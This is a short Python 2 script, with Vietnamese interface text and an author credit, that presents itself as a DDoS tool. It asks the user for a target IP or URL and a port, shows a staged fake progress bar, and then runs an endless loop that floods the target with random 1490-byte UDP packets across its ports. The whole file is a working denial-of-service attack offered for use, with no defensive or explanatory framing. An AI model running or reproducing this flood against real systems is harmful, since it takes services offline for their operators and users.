import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet Ddos TKT ( VIET NAM")

print "TÁC GIẢ:   : THỎ KHÔNG TRẮNG"


print "Facebook : https://www.facebook.com/syaoran582"
print " TẦN SUẤT: BẠN CÓ THỂ CHỌN SỐ NGẪU NHIÊN ( MẶC ĐỊNH THƯỜNG LÀ 80)"
ip = raw_input("IP ( hoặc url web ) : ")
port = input("Tần suất   : ")

os.system("clear")
os.system("figlet ĐANG TẤN CÔNG")
print "[                    ] 0% "
time.sleep(5)
print "[===== ĐÃ ĐƯỢC               ] 25%"
time.sleep(5)
print "[========== ĐÃ ĐƯỢC         ] 50%"
time.sleep(5)
print "[=============== ĐÃ ĐƯỢC    ] 75%"
time.sleep(5)
print "[==================== HOÀN THÀNH] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "đã gửi  %s dữ liệu tấn công  %s vào:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

